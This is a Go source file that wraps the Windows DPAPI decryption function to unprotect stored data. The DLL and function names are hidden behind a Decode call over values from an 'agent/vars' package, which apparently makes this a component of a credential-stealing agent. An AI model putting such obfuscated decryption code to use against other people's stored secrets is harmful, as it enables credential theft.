package lib

import (
	"agent/vars"
	"errors"
	"unsafe"

	"golang.org/x/sys/windows"
)

type cryptProtect uint32

const (
	cryptProtectUIForbidden  cryptProtect = 0x1
	cryptProtectLocalMachine cryptProtect = 0x4
)

var (
	dllcrypt32      = windows.NewLazySystemDLL(Decode(vars.Path_cryptdll))
	procDecryptData = dllcrypt32.NewProc(Decode(vars.Key_unprotect))
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

func newBlob(d []byte) *dataBlob {
	if len(d) == 0 {
		return &dataBlob{}
	}
	return &dataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *dataBlob) toByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func (b *dataBlob) zeroMemory() {
	zeros := make([]byte, b.cbData)
	copy((*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:], zeros)
}

func (b *dataBlob) free() error {
	_, err := windows.LocalFree(windows.Handle(unsafe.Pointer(b.pbData)))
	if err != nil {
		return errors.New(err.Error() + " (localfree)")
	}

	return nil
}

func decryptBytes(data, entropy []byte, cf cryptProtect) ([]byte, error) {
	var (
		outblob dataBlob
		r       uintptr
		err     error
	)
	if len(entropy) > 0 {
		r, _, err = procDecryptData.Call(uintptr(unsafe.Pointer(newBlob(data))), 0, uintptr(unsafe.Pointer(newBlob(entropy))), 0, 0, uintptr(cf), uintptr(unsafe.Pointer(&outblob)))
	} else {
		r, _, err = procDecryptData.Call(uintptr(unsafe.Pointer(newBlob(data))), 0, 0, 0, 0, uintptr(cf), uintptr(unsafe.Pointer(&outblob)))
	}
	if r == 0 {
		return nil, errors.New(err.Error() + " (procdecryptdata)")
	}

	dec := outblob.toByteArray()
	outblob.zeroMemory()
	return dec, outblob.free()
}

func DPAPI_Decrypt(data string) (string, error) {
	return DecryptEntropy(data, "")
}

func DecryptBytes(data []byte) ([]byte, error) {
	return decryptBytes(data, nil, cryptProtectUIForbidden)
}

func DecryptBytesEntropy(data, entropy []byte) ([]byte, error) {
	return decryptBytes(data, entropy, cryptProtectUIForbidden)
}

func DecryptEntropy(raw string, entropy string) (string, error) {
	b, err := decryptBytes([]byte(raw), []byte(entropy), cryptProtectUIForbidden)
	if err != nil {
		return "", errors.New(err.Error() + " (decryptbytes)")
	}
	return string(b), nil
}
